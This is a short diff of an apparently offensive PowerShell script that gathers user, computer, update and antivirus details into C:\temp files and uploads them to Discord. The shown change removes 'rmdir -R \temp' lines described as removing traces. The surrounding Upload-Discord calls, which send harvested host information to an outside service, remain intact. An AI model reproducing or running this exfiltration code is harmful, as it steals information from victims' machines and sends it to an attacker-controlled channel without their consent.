@@ -51,8 +51,6 @@ Upload-Discord -file "C:\temp\UserInfo.txt" -text "User Informations :"
 Upload-Discord -file "C:\temp\ComputerInfo.txt" -text "Computer Informations :"
 Upload-Discord -file "C:\temp\WinUpdates.txt" -text "Updates Informations :"
 
-#Removing every file to remove traces
-rmdir -R \temp
 }
 
 function Upload-Discord {
@@ -98,5 +96,4 @@ function version-av {
   Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
   Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
   cd C:\
-  rmdir -R \temp
 }
